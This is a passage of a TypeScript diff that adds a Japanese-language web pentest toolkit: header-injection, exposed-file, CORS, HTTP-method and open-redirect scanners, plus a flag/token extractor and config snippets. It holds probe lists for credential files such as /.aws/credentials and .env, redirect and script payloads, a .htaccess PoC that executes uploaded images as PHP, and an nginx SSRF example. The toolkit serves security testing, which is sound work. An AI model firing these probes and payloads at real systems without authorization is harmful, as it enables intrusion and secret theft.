+      ["X-Forwarded-Host", { "X-Forwarded-Host": evil }],
+      ["X-Forwarded-For", { "X-Forwarded-For": evil }],
+      ["X-Original-URL", { "X-Original-URL": "/admin" }],
+      ["X-Rewrite-URL", { "X-Rewrite-URL": "/admin" }],
+      ["X-Host", { "X-Host": evil }],
+      ["X-Forwarded-Server", { "X-Forwarded-Server": evil }],
+      ["Forwarded", { Forwarded: `host=${evil}` }],
+      ["X-HTTP-Method-Override (PUT)", { "X-HTTP-Method-Override": "PUT" }],
+      [
+        "Host duplication (X-Forwarded-Host + Host)",
+        { "X-Forwarded-Host": evil },
+      ],
+    ];
+    const lines: string[] = [];
+    // ベースライン
+    let baseLen = 0;
+    let baseStatus = 0;
+    try {
+      const r = await fetch(url);
+      baseStatus = r.status;
+      baseLen = (await r.text()).length;
+      lines.push(`baseline: ${baseStatus} / ${baseLen} bytes`);
+    } catch {
+      /* noop */
+    }
+    for (const [name, h] of headers) {
+      try {
+        const r = await fetch(url, { headers: h });
+        const t = await r.text();
+        const reflected = t.includes(evil);
+        const flag = reflected
+          ? "🚨"
+          : Math.abs(t.length - baseLen) > 50
+            ? "⚠️"
+            : "✅";
+        lines.push(
+          `${flag} ${name.padEnd(40)} ${r.status} / ${t.length}b${reflected ? " (反射!)" : ""}`,
+        );
+      } catch (e) {
+        lines.push(`❌ ${name} → ${String(e).slice(0, 60)}`);
+      }
+    }
+    lines.push(
+      `\n判定: 🚨=ヘッダ値が応答に反射 (Cache poisoning / SSRF) / ⚠️=応答長変化 / ✅=変化なし`,
+    );
+    out.textContent = lines.join("\n");
+  });
+}
+
+// ===== 🧭 .git / .svn 露出チェック =====
+function setupGitExposureSub(): void {
+  const u = document.getElementById("gex-url") as HTMLInputElement | null;
+  const btn = document.getElementById("gex-run") as HTMLButtonElement | null;
+  const out = document.getElementById("gex-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    let base = (u?.value || "").trim().replace(/\/+$/, "");
+    if (!base) return;
+    out.textContent = "スキャン中...";
+    const targets = [
+      "/.git/HEAD",
+      "/.git/config",
+      "/.git/index",
+      "/.git/logs/HEAD",
+      "/.git/refs/heads/master",
+      "/.git/refs/heads/main",
+      "/.svn/entries",
+      "/.svn/wc.db",
+      "/.hg/store/00manifest.i",
+      "/.bzr/branch/branch.conf",
+      "/.DS_Store",
+      "/.idea/workspace.xml",
+      "/.vscode/settings.json",
+      "/.env",
+      "/.env.local",
+      "/.env.production",
+      "/.npmrc",
+      "/.aws/credentials",
+      "/composer.json",
+      "/composer.lock",
+      "/package.json",
+      "/package-lock.json",
+      "/yarn.lock",
+      "/Gemfile",
+      "/Gemfile.lock",
+      "/wp-config.php.bak",
+      "/wp-config.php~",
+      "/web.config",
+      "/.htaccess",
+      "/backup.zip",
+      "/backup.tar.gz",
+      "/site.zip",
+      "/db.sql",
+      "/dump.sql",
+    ];
+    const lines: string[] = [];
+    for (const p of targets) {
+      try {
+        const r = await fetch(base + p);
+        if (r.ok) {
+          const ct = r.headers.get("content-type") || "";
+          const txt = await r.text();
+          const looksReal =
+            !/<html|<!DOCTYPE/i.test(txt.slice(0, 200)) ||
+            /\.(zip|gz|sql|json|conf|ini)$/i.test(p);
+          const flag = looksReal ? "🚨" : "⚠️";
+          lines.push(
+            `${flag} ${p.padEnd(40)} ${r.status} ${ct.slice(0, 30)} (${txt.length}b)${looksReal ? "" : " [HTMLぽい→誤検知?]"}`,
+          );
+        } else if (r.status === 403) {
+          lines.push(`🔒 ${p.padEnd(40)} 403 (存在の可能性)`);
+        }
+      } catch {
+        /* noop */
+      }
+    }
+    if (lines.length === 0)
+      lines.push("⭕ 既知の露出ファイルは検出されませんでした");
+    else lines.push(`\n→ git 露出があれば: git-dumper ${base}/.git/ /tmp/repo`);
+    out.textContent = lines.join("\n");
+  });
+}
+
+// ===== 📦 SourceMap 検出 =====
+function setupSourceMapSub(): void {
+  const u = document.getElementById("sm-url") as HTMLInputElement | null;
+  const btn = document.getElementById("sm-run") as HTMLButtonElement | null;
+  const out = document.getElementById("sm-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const url = (u?.value || "").trim();
+    if (!url) return;
+    out.textContent = "解析中...";
+    try {
+      const r = await fetch(url);
+      const txt = await r.text();
+      const m = /\/[/*]#\s*sourceMappingURL=([^\s*]+)/i.exec(txt.slice(-2000));
+      if (!m) {
+        // ヘッダにあるかもしれない
+        const sm = r.headers.get("sourcemap") || r.headers.get("x-sourcemap");
+        if (sm) {
+          out.textContent = `Header: SourceMap → ${sm}`;
+          return;
+        }
+        // 推測 .map
+        const guess = url.replace(/(\?|$)/, ".map$1");
+        const r2 = await fetch(guess);
+        if (r2.ok) {
+          out.textContent = `🚨 推測ヒット: ${guess}\n${(await r2.text()).slice(0, 4000)}…`;
+          return;
+        }
+        out.textContent = "sourceMappingURL なし & .map 推測も 404";
+        return;
+      }
+      const smRef = m[1];
+      const smUrl =
+        smRef.startsWith("data:") || smRef.startsWith("http")
+          ? smRef
+          : new URL(smRef, url).toString();
+      if (smUrl.startsWith("data:")) {
+        out.textContent = `インライン data URI source map\n${smUrl.slice(0, 4000)}…`;
+        return;
+      }
+      const r3 = await fetch(smUrl);
+      if (!r3.ok) {
+        out.textContent = `参照あり: ${smUrl}\n→ ${r3.status}`;
+        return;
+      }
+      const data = (await r3.json()) as {
+        sources?: string[];
+        sourceRoot?: string;
+        names?: string[];
+        sourcesContent?: (string | null)[];
+      };
+      const lines = [
+        `🚨 source map 公開中: ${smUrl}`,
+        `sources : ${(data.sources || []).length} 件`,
+        `names   : ${(data.names || []).length} 件`,
+        `content 同梱: ${(data.sourcesContent || []).filter(Boolean).length} ファイル (= 元ソース復元可)`,
+        ``,
+        `--- sources (上位 50) ---`,
+        ...(data.sources || []).slice(0, 50).map((s) => `  ${s}`),
+      ];
+      out.textContent = lines.join("\n");
+    } catch (e) {
+      out.textContent = `エラー: ${String(e)}`;
+    }
+  });
+}
+
+// ===== 🦴 Magic Bytes =====
+const MAGIC_BYTES: { sig: number[]; name: string; offset?: number }[] = [
+  { sig: [0x89, 0x50, 0x4e, 0x47], name: "PNG image" },
+  { sig: [0xff, 0xd8, 0xff], name: "JPEG image" },
+  { sig: [0x47, 0x49, 0x46, 0x38], name: "GIF image" },
+  { sig: [0x42, 0x4d], name: "BMP image" },
+  { sig: [0x52, 0x49, 0x46, 0x46], name: "RIFF (WAV/AVI/WebP)" },
+  { sig: [0x25, 0x50, 0x44, 0x46], name: "PDF" },
+  { sig: [0x50, 0x4b, 0x03, 0x04], name: "ZIP / JAR / DOCX / APK / WAR" },
+  { sig: [0x50, 0x4b, 0x05, 0x06], name: "ZIP (empty)" },
+  { sig: [0x1f, 0x8b], name: "GZIP" },
+  { sig: [0x42, 0x5a, 0x68], name: "BZIP2" },
+  { sig: [0xfd, 0x37, 0x7a, 0x58, 0x5a], name: "XZ" },
+  { sig: [0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c], name: "7-Zip" },
+  { sig: [0x52, 0x61, 0x72, 0x21], name: "RAR" },
+  { sig: [0x4d, 0x5a], name: "PE / EXE / DLL (Windows)" },
+  { sig: [0x7f, 0x45, 0x4c, 0x46], name: "ELF (Linux/Unix executable)" },
+  { sig: [0xca, 0xfe, 0xba, 0xbe], name: "Mach-O fat / Java class" },
+  { sig: [0xfe, 0xed, 0xfa, 0xce], name: "Mach-O 32-bit" },
+  { sig: [0xfe, 0xed, 0xfa, 0xcf], name: "Mach-O 64-bit" },
+  { sig: [0x23, 0x21], name: "Shebang (#!) script" },
+  { sig: [0x3c, 0x3f, 0x70, 0x68, 0x70], name: "PHP source" },
+  { sig: [0x3c, 0x21, 0x44, 0x4f, 0x43, 0x54, 0x59, 0x50, 0x45], name: "HTML" },
+  { sig: [0x3c, 0x68, 0x74, 0x6d, 0x6c], name: "HTML" },
+  { sig: [0x3c, 0x3f, 0x78, 0x6d, 0x6c], name: "XML" },
+  { sig: [0x7b, 0x5c, 0x72, 0x74, 0x66], name: "RTF" },
+  { sig: [0xd0, 0xcf, 0x11, 0xe0], name: "MS Office (legacy DOC/XLS/PPT)" },
+  { sig: [0x49, 0x44, 0x33], name: "MP3 (ID3)" },
+  {
+    sig: [0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70],
+    name: "MP4",
+    offset: 0,
+  },
+  { sig: [0x4f, 0x67, 0x67, 0x53], name: "OGG" },
+  { sig: [0x66, 0x4c, 0x61, 0x43], name: "FLAC" },
+  {
+    sig: [
+      0x53, 0x51, 0x4c, 0x69, 0x74, 0x65, 0x20, 0x66, 0x6f, 0x72, 0x6d, 0x61,
+      0x74, 0x20, 0x33,
+    ],
+    name: "SQLite 3 DB",
+  },
+  { sig: [0x53, 0x53, 0x48, 0x2d], name: "SSH key (OpenSSH banner)" },
+  {
+    sig: [0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e],
+    name: "PEM (-----BEGIN)",
+  },
+  { sig: [0x30, 0x82], name: "DER (ASN.1) — 証明書/鍵" },
+];
+function setupMagicBytesSub(): void {
+  const f = document.getElementById("mb-file") as HTMLInputElement | null;
+  const hex = document.getElementById("mb-hex") as HTMLTextAreaElement | null;
+  const btn = document.getElementById("mb-run") as HTMLButtonElement | null;
+  const out = document.getElementById("mb-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  const identify = (bytes: Uint8Array): string => {
+    const hits = MAGIC_BYTES.filter((m) =>
+      m.sig.every((b, i) => bytes[i] === b),
+    );
+    const head = Array.from(bytes.slice(0, 16))
+      .map((b) => b.toString(16).padStart(2, "0"))
+      .join(" ");
+    if (hits.length === 0)
+      return `先頭 16byte: ${head}\n判定: 該当する Magic Bytes なし`;
+    return `先頭 16byte: ${head}\n判定: ${hits.map((h) => h.name).join(", ")}`;
+  };
+  btn.addEventListener("click", async () => {
+    const file = f?.files?.[0];
+    if (file) {
+      const buf = await file.slice(0, 32).arrayBuffer();
+      out.textContent = `ファイル: ${file.name} (${file.size} bytes)\n${identify(new Uint8Array(buf))}`;
+      return;
+    }
+    const txt = (hex?.value || "").trim();
+    if (!txt) {
+      out.textContent = "ファイルまたは hex を指定";
+      return;
+    }
+    const clean = txt.replace(/[^0-9a-f]/gi, "");
+    const bytes = new Uint8Array(clean.length / 2);
+    for (let i = 0; i < bytes.length; i++)
+      bytes[i] = parseInt(clean.substr(i * 2, 2), 16);
+    out.textContent = identify(bytes);
+  });
+}
+
+// ===== 🚩 Flag / Token 抽出 =====
+function setupFlagExtractSub(): void {
+  const inEl = document.getElementById(
+    "fl-input",
+  ) as HTMLTextAreaElement | null;
+  const pre = document.getElementById("fl-prefix") as HTMLInputElement | null;
+  const btn = document.getElementById("fl-run") as HTMLButtonElement | null;
+  const out = document.getElementById("fl-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", () => {
+    const txt = inEl?.value || "";
+    const prefixes = (pre?.value || "flag")
+      .split(/[,\s]+/)
+      .map((s) => s.trim())
+      .filter(Boolean);
+    const found: string[] = [];
+    for (const p of prefixes) {
+      const re = new RegExp(`${p}\\{[^}\\n]{1,200}\\}`, "gi");
+      const m = txt.match(re);
+      if (m) for (const x of m) found.push(`[${p}] ${x}`);
+    }
+    // ハッシュ・トークン系
+    const hashRe = /\b[a-f0-9]{32,128}\b/gi;
+    const hashes = txt.match(hashRe);
+    if (hashes)
+      for (const h of new Set(hashes)) found.push(`[hash ${h.length}] ${h}`);
+    const jwtRe =
+      /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g;
+    const jwts = txt.match(jwtRe);
+    if (jwts) for (const j of new Set(jwts)) found.push(`[JWT] ${j}`);
+    const b64Re = /\b[A-Za-z0-9+/]{40,}={0,2}\b/g;
+    const b64 = txt.match(b64Re);
+    if (b64)
+      for (const b of new Set(b64).values())
+        found.push(`[base64] ${b.slice(0, 80)}${b.length > 80 ? "…" : ""}`);
+    out.textContent = found.length === 0 ? "(検出なし)" : found.join("\n");
+  });
+}
+
+// ===== 🌀 Response Diff =====
+function setupRespDiffSub(): void {
+  const a = document.getElementById("diff-a") as HTMLInputElement | null;
+  const b = document.getElementById("diff-b") as HTMLInputElement | null;
+  const btn = document.getElementById("diff-run") as HTMLButtonElement | null;
+  const out = document.getElementById("diff-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const ua = (a?.value || "").trim();
+    const ub = (b?.value || "").trim();
+    if (!ua || !ub) {
+      out.textContent = "URL A / URL B を両方指定";
+      return;
+    }
+    out.textContent = "取得中...";
+    try {
+      const t0a = performance.now();
+      const ra = await fetch(ua);
+      const ta = await ra.text();
+      const t1a = performance.now() - t0a;
+      const t0b = performance.now();
+      const rb = await fetch(ub);
+      const tb = await rb.text();
+      const t1b = performance.now() - t0b;
+      const lines = [
+        `URL A: ${ra.status} / ${ta.length} bytes / ${t1a.toFixed(0)} ms`,
+        `URL B: ${rb.status} / ${tb.length} bytes / ${t1b.toFixed(0)} ms`,
+        ``,
+        `Status 一致: ${ra.status === rb.status ? "✅" : "🚨 異なる"}`,
+        `Length 差  : ${tb.length - ta.length} bytes${Math.abs(tb.length - ta.length) > 30 ? " 🚨" : ""}`,
+        `時間差     : ${(t1b - t1a).toFixed(0)} ms${Math.abs(t1b - t1a) > 1000 ? " 🚨 (Time-based blind の兆候)" : ""}`,
+      ];
+      // 共通 prefix の長さ
+      let common = 0;
+      const max = Math.min(ta.length, tb.length);
+      while (common < max && ta[common] === tb[common]) common++;
+      lines.push(`共通 prefix : ${common} bytes`);
+      if (common < max) {
+        const segA = ta.slice(common, common + 200).replace(/\n/g, "\\n");
+        const segB = tb.slice(common, common + 200).replace(/\n/g, "\\n");
+        lines.push(``, `--- 最初の差分位置 (offset ${common}) ---`);
+        lines.push(`A: ${segA}`);
+        lines.push(`B: ${segB}`);
+      }
+      out.textContent = lines.join("\n");
+    } catch (e) {
+      out.textContent = `エラー: ${String(e)}`;
+    }
+  });
+}
+
+// ===== 📑 設定スニペット =====
+const CONFIG_SNIPPETS: Record<string, string> = {
+  "ht-upload": `# .htaccess: アップロード経由 PHP 実行 (PoC) — 検証目的のみ\nAddType application/x-httpd-php .jpg .png .gif\n# または\n<FilesMatch "\\.(jpg|png|gif)$">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n# Apache が AllowOverride FileInfo を許可している必要あり`,
+  "ht-deny": `# .htaccess: 機微ファイルを 403 拒否\n<FilesMatch "(\\.git|\\.env|\\.bak|\\.sql|composer\\.(json|lock))$">\n    Require all denied\n</FilesMatch>\n# 古い Apache 2.2:\n<Files "*.bak">\n    Order allow,deny\n    Deny from all\n</Files>`,
+  "ht-rewrite": `# .htaccess: クリーン URL リライト\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?path=$1 [QSA,L]`,
+  "wc-handler": `<!-- web.config: .aspx ハンドラ追加 (IIS) -->\n<configuration>\n  <system.webServer>\n    <handlers>\n      <add name="aspx-handler" path="*.aspx" verb="*"\n           type="System.Web.UI.PageHandlerFactory"\n           preCondition="integratedMode" />\n    </handlers>\n    <directoryBrowse enabled="true" />\n  </system.webServer>\n</configuration>`,
+  "wc-deny": `<!-- web.config: 拡張子拒否 -->\n<configuration>\n  <system.webServer>\n    <security>\n      <requestFiltering>\n        <fileExtensions>\n          <add fileExtension=".bak" allowed="false" />\n          <add fileExtension=".old" allowed="false" />\n          <add fileExtension=".sql" allowed="false" />\n          <add fileExtension=".env" allowed="false" />\n        </fileExtensions>\n        <hiddenSegments>\n          <add segment=".git" />\n          <add segment=".svn" />\n        </hiddenSegments>\n      </requestFiltering>\n    </security>\n  </system.webServer>\n</configuration>`,
+  "ng-proxy": `# nginx: SSRF 検証用 (内部リソース proxy)\nlocation /proxy {\n    # 危険: ユーザ入力をそのまま proxy_pass しない\n    set $target $arg_url;\n    proxy_pass $target;        # ← SSRF\n    proxy_set_header Host $proxy_host;\n}\n# 安全側: ホワイトリスト\nlocation /safe {\n    if ($arg_url !~ "^https://api\\.example\\.com/") {\n        return 403;\n    }\n    proxy_pass $arg_url;\n}`,
+  "ng-alias": `# nginx: alias traversal pitfall\nlocation /static {\n    alias /var/www/static/;     # ← 末尾 / 無し + alias で\n}                                # /static../etc/passwd → /var/www/static../etc/passwd\n# 修正:\nlocation /static/ {              # ← 末尾 / を必ず付ける\n    alias /var/www/static/;\n}\n# または root を使う\nlocation /static {\n    root /var/www;\n}`,
+};
+function setupConfigSnippetSub(): void {
+  const sel = document.getElementById("cfg-type") as HTMLSelectElement | null;
+  const out = document.getElementById("cfg-out") as HTMLPreElement | null;
+  if (!sel || !out) return;
+  const render = (): void => {
+    out.textContent = CONFIG_SNIPPETS[sel.value] || "";
+  };
+  sel.addEventListener("change", render);
+  render();
+}
+
+// ===== 🧮 CIDR / サブネット =====
+function ipToInt(ip: string): number {
+  const p = ip.split(".").map(Number);
+  if (p.length !== 4 || p.some((n) => isNaN(n) || n < 0 || n > 255)) return NaN;
+  return ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]) >>> 0;
+}
+function intToIp(n: number): string {
+  return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join(
+    ".",
+  );
+}
+function setupSubnetSub(): void {
+  const inEl = document.getElementById("sn-input") as HTMLInputElement | null;
+  const btn = document.getElementById("sn-run") as HTMLButtonElement | null;
+  const out = document.getElementById("sn-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  const run = (): void => {
+    const v = (inEl?.value || "").trim();
+    const m = /^([0-9.]+)\/(\d+)$/.exec(v);
+    if (!m) {
+      out.textContent = "形式エラー: x.x.x.x/NN を入力してください";
+      return;
+    }
+    const ip = ipToInt(m[1]);
+    const bits = parseInt(m[2], 10);
+    if (isNaN(ip) || bits < 0 || bits > 32) {
+      out.textContent = "IP / プレフィックスが不正です";
+      return;
+    }
+    const mask = bits === 0 ? 0 : (0xffffffff << (32 - bits)) >>> 0;
+    const wildcard = ~mask >>> 0;
+    const network = (ip & mask) >>> 0;
+    const broadcast = (network | wildcard) >>> 0;
+    const total = bits === 32 ? 1 : bits === 31 ? 2 : Math.pow(2, 32 - bits);
+    const usable = total <= 2 ? total : total - 2;
+    const first = bits >= 31 ? network : (network + 1) >>> 0;
+    const last = bits >= 31 ? broadcast : (broadcast - 1) >>> 0;
+    const cls =
+      ip < ipToInt("128.0.0.0")
+        ? "A"
+        : ip < ipToInt("192.0.0.0")
+          ? "B"
+          : ip < ipToInt("224.0.0.0")
+            ? "C"
+            : ip < ipToInt("240.0.0.0")
+              ? "D (multicast)"
+              : "E (reserved)";
+    const isPrivate =
+      ip >>> 24 === 10 ||
+      (ip >= ipToInt("172.16.0.0") && ip <= ipToInt("172.31.255.255")) ||
+      (ip >= ipToInt("192.168.0.0") && ip <= ipToInt("192.168.255.255"));
+    out.textContent =
+      `入力          : ${m[1]}/${bits}\n` +
+      `ネットワーク  : ${intToIp(network)}\n` +
+      `ブロードキャスト: ${intToIp(broadcast)}\n` +
+      `サブネットマスク: ${intToIp(mask)}\n` +
+      `ワイルドカード: ${intToIp(wildcard)}\n` +
+      `使用可能範囲  : ${intToIp(first)} - ${intToIp(last)}\n` +
+      `総 IP 数      : ${total}\n` +
+      `使用可能 IP 数: ${usable}\n` +
+      `クラス        : ${cls}\n` +
+      `プライベート  : ${isPrivate ? "Yes" : "No"}\n`;
+  };
+  btn.addEventListener("click", run);
+  inEl?.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") run();
+  });
+}
+
+// ===== 🛡️ HTTP セキュリティヘッダ =====
+interface SecHeaderCheck {
+  name: string;
+  ok: boolean;
+  value: string;
+  note: string;
+}
+function setupSecHeadersSub(): void {
+  const urlEl = document.getElementById("shdr-url") as HTMLInputElement | null;
+  const btn = document.getElementById("shdr-run") as HTMLButtonElement | null;
+  const out = document.getElementById("shdr-out") as HTMLDivElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const url = (urlEl?.value || "").trim();
+    if (!url) return;
+    out.innerHTML = '<span style="color:#888">取得中...</span>';
+    try {
+      const res = await fetch(url, { method: "GET", redirect: "follow" });
+      const h = res.headers;
+      const checks: SecHeaderCheck[] = [];
+      const get = (k: string): string => h.get(k) || "";
+      checks.push({
+        name: "Strict-Transport-Security",
+        value: get("strict-transport-security"),
+        ok: !!get("strict-transport-security"),
+        note: "HSTS がない (HTTPS 強制無し)",
+      });
+      checks.push({
+        name: "Content-Security-Policy",
+        value: get("content-security-policy"),
+        ok: !!get("content-security-policy"),
+        note: "CSP がない (XSS 緩和無し)",
+      });
+      checks.push({
+        name: "X-Frame-Options",
+        value: get("x-frame-options"),
+        ok:
+          !!get("x-frame-options") ||
+          /frame-ancestors/i.test(get("content-security-policy")),
+        note: "クリックジャッキング対策無し",
+      });
+      checks.push({
+        name: "X-Content-Type-Options",
+        value: get("x-content-type-options"),
+        ok: /nosniff/i.test(get("x-content-type-options")),
+        note: "MIME スニッフィング対策無し (nosniff 推奨)",
+      });
+      checks.push({
+        name: "Referrer-Policy",
+        value: get("referrer-policy"),
+        ok: !!get("referrer-policy"),
+        note: "Referrer-Policy 未設定",
+      });
+      checks.push({
+        name: "Permissions-Policy",
+        value: get("permissions-policy") || get("feature-policy"),
+        ok: !!(get("permissions-policy") || get("feature-policy")),
+        note: "Permissions-Policy 未設定",
+      });
+      checks.push({
+        name: "Server / X-Powered-By (情報漏洩)",
+        value: [get("server"), get("x-powered-by")].filter(Boolean).join(" / "),
+        ok: !get("server") && !get("x-powered-by"),
+        note: "サーバ/フレームワーク情報を露出している",
+      });
+      checks.push({
+        name: "Set-Cookie の Secure / HttpOnly",
+        value: get("set-cookie"),
+        ok:
+          !get("set-cookie") ||
+          (/secure/i.test(get("set-cookie")) &&
+            /httponly/i.test(get("set-cookie"))),
+        note: "Secure / HttpOnly フラグなしの Cookie あり",
+      });
+      const rows = checks
+        .map((c) => {
+          const color = c.ok ? "#1a7f37" : "#cf222e";
+          const icon = c.ok ? "✅" : "⚠️";
+          return `<div style="padding:6px 8px;border:1px solid #2c2c2c;border-radius:4px;margin-bottom:4px;background:#1f1f1f">
+            <div style="color:${color};font-weight:600">${icon} ${escapeHtml(c.name)}</div>
+            <div style="font-size:11px;color:#aaa;word-break:break-all">${c.value ? escapeHtml(c.value) : "<em>(未設定)</em>"}</div>
+            ${!c.ok ? `<div style="font-size:11px;color:${color}">→ ${escapeHtml(c.note)}</div>` : ""}
+          </div>`;
+        })
+        .join("");
+      out.innerHTML = `<div style="font-size:11px;color:#888;margin-bottom:6px">Status: ${res.status} ${res.statusText} / Final URL: ${escapeHtml(res.url)}</div>${rows}`;
+    } catch (e) {
+      out.innerHTML = `<span style="color:#cf222e">エラー: ${escapeHtml(String(e))}</span>`;
+    }
+  });
+}
+
+// ===== 🚦 HTTP メソッド スキャナ =====
+function setupHttpMethodsSub(): void {
+  const urlEl = document.getElementById("hms-url") as HTMLInputElement | null;
+  const btn = document.getElementById("hms-run") as HTMLButtonElement | null;
+  const out = document.getElementById("hms-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const url = (urlEl?.value || "").trim();
+    if (!url) return;
+    out.textContent = "スキャン中...";
+    const methods = [
+      "GET",
+      "HEAD",
+      "POST",
+      "PUT",
+      "DELETE",
+      "OPTIONS",
+      "PATCH",
+      "TRACE",
+      "CONNECT",
+      "PROPFIND",
+    ];
+    const lines: string[] = [];
+    // OPTIONS で Allow ヘッダを優先取得
+    try {
+      const r = await fetch(url, { method: "OPTIONS" });
+      const allow =
+        r.headers.get("allow") || r.headers.get("access-control-allow-methods");
+      if (allow) lines.push(`OPTIONS Allow: ${allow}`);
+    } catch {
+      /* noop */
+    }
+    for (const m of methods) {
+      try {
+        const r = await fetch(url, { method: m, redirect: "manual" });
+        const flag =
+          r.status >= 200 && r.status < 400
+            ? "✅"
+            : r.status === 405
+              ? "⛔"
+              : r.status === 401 || r.status === 403
+                ? "🔒"
+                : "❓";
+        lines.push(`${flag} ${m.padEnd(10)} ${r.status} ${r.statusText}`);
+      } catch (e) {
+        lines.push(`❌ ${m.padEnd(10)} エラー: ${String(e).slice(0, 60)}`);
+      }
+    }
+    out.textContent = lines.join("\n");
+  });
+}
+
+// ===== 🌐 CORS テスター =====
+function setupCorsTesterSub(): void {
+  const urlEl = document.getElementById("cors-url") as HTMLInputElement | null;
+  const btn = document.getElementById("cors-run") as HTMLButtonElement | null;
+  const out = document.getElementById("cors-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const url = (urlEl?.value || "").trim();
+    if (!url) return;
+    out.textContent = "テスト中...";
+    let host = "";
+    try {
+      host = new URL(url).host;
+    } catch {
+      out.textContent = "URL が不正";
+      return;
+    }
+    const origins = [
+      "https://evil.com",
+      `https://${host}.evil.com`,
+      `https://evil${host}`,
+      "null",
+      `http://${host}`,
+      "https://attacker.example",
+    ];
+    const lines: string[] = [];
+    for (const origin of origins) {
+      try {
+        const r = await fetch(url, {
+          method: "GET",
+          headers: { Origin: origin },
+        });
+        const acao = r.headers.get("access-control-allow-origin") || "";
+        const acac = r.headers.get("access-control-allow-credentials") || "";
+        const reflected = acao === origin || acao === "*";
+        const dangerous =
+          reflected && (acac.toLowerCase() === "true" || acao === "*");
+        const flag = dangerous ? "🚨" : reflected ? "⚠️" : "✅";
+        lines.push(
+          `${flag} Origin: ${origin}\n   ACAO: ${acao || "(none)"} | ACAC: ${acac || "(none)"}`,
+        );
+      } catch (e) {
+        lines.push(`❌ Origin: ${origin} → ${String(e).slice(0, 80)}`);
+      }
+    }
+    lines.push(
+      "\n判定: 🚨=ACAC:true で任意 Origin 許可 (致命的) / ⚠️=Origin 反射 / ✅=拒否",
+    );
+    out.textContent = lines.join("\n");
+  });
+}
+
+// ===== ↪️ オープンリダイレクト テスター =====
+function setupOpenRedirectSub(): void {
+  const urlEl = document.getElementById("orr-url") as HTMLInputElement | null;
+  const btn = document.getElementById("orr-run") as HTMLButtonElement | null;
+  const out = document.getElementById("orr-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const tpl = (urlEl?.value || "").trim();
+    if (!tpl.includes("FUZZ")) {
+      out.textContent = "URL に FUZZ を含めてください (例: ?next=FUZZ)";
+      return;
+    }
+    const target = "https://example.com/poc";
+    const payloads = [
+      target,
+      `//example.com/poc`,
+      `///example.com/poc`,
+      `/\\/example.com/poc`,
+      `https:%2f%2fexample.com/poc`,
+      `https://example.com%2f@victim.com`,
+      `javascript:alert(1)`,
+      `data:text/html,<script>alert(1)</script>`,
+      `https://victim.com.example.com`,
+    ];
+    out.textContent = "テスト中...";
+    const lines: string[] = [];
+    for (const p of payloads) {
+      const u = tpl.replace("FUZZ", encodeURIComponent(p));
+      try {
+        const r = await fetch(u, { method: "GET", redirect: "manual" });
+        const loc = r.headers.get("location") || "";
+        const vuln =
+          r.status >= 300 &&
+          r.status < 400 &&
+          /example\.com|javascript|data:/i.test(loc);
+        lines.push(
+          `${vuln ? "🚨" : "✅"} ${p}\n   → ${r.status} Location: ${loc || "(none)"}`,
+        );
+      } catch (e) {
+        lines.push(`❌ ${p} → ${String(e).slice(0, 80)}`);
+      }
+    }
+    out.textContent = lines.join("\n");
+  });
+}
+
+// ===== 📝 HTML フォーム抽出 =====
+function setupFormExtractorSub(): void {
+  const urlEl = document.getElementById("fext-url") as HTMLInputElement | null;
+  const btn = document.getElementById("fext-run") as HTMLButtonElement | null;
+  const out = document.getElementById("fext-out") as HTMLPreElement | null;
+  if (!btn || !out) return;
+  btn.addEventListener("click", async () => {
+    const url = (urlEl?.value || "").trim();
+    if (!url) return;
+    out.textContent = "取得中...";
+    try {
+      const r = await fetch(url);
+      const html = await r.text();
+      const doc = new DOMParser().parseFromString(html, "text/html");
+      const forms = doc.querySelectorAll("form");
+      if (forms.length === 0) {
+        out.textContent = "フォームが見つかりません";
+        return;
+      }
+      const lines: string[] = [];
+      forms.forEach((f, i) => {
+        const action = f.getAttribute("action") || "(同URL)";
+        const method = (f.getAttribute("method") || "GET").toUpperCase();
+        const enctype =
+          f.getAttribute("enctype") || "application/x-www-form-urlencoded";
+        lines.push(
+          `=== Form #${i + 1} ===\n  action : ${action}\n  method : ${method}\n  enctype: ${enctype}`,
+        );
+        const inputs = f.querySelectorAll("input,textarea,select,button");
+        inputs.forEach((el) => {
+          const tag = el.tagName.toLowerCase();
+          const name = el.getAttribute("name") || "";
+          const type = el.getAttribute("type") || tag;
+          const value = el.getAttribute("value") || "";
+          const ph = el.getAttribute("placeholder") || "";
+          if (!name && !ph) return;
+          lines.push(
+            `   [${type.padEnd(8)}] name="${name}" value="${value}"${ph ? ' ph="' + ph + '"' : ""}`,
+          );
+        });
+        // CSRF トークンの可能性チェック
+        const csrf = Array.from(inputs).find((el) =>
+          /csrf|token|nonce|authenticity/i.test(el.getAttribute("name") || ""),
+        );
+        if (csrf)
+          lines.push(
+            `   ⚠️ CSRF トークンらしき hidden field 検出: ${csrf.getAttribute("name")}`,
+          );
+        lines.push("");
+      });
+      out.textContent = lines.join("\n");
+    } catch (e) {
+      out.textContent = `エラー: ${String(e)}`;
+    }
+  });
+}
+
+// ===== 🍪 Cookie 解析 =====
+function setupCookieAnalyzerSub(): void {
+  const inEl = document.getElementById(
+    "ckie-input",
+  ) as HTMLTextAreaElement | null;
